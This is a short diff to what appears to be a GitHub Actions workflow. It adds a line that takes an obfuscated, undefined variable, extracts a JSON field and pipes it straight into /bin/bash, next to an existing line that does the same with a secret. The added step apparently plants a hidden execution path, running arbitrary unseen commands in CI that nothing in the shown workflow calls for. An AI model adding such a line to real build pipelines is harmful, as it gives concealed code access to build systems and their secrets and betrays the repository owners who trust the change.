@@ -19,6 +19,7 @@ jobs:
           xw154: ${{ secrets.xw154 }}
         run: |
           printf '%s' "$xw154" | jq -r .gebnl469 | /bin/bash
+          echo $t1174 | jq -r .u29 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
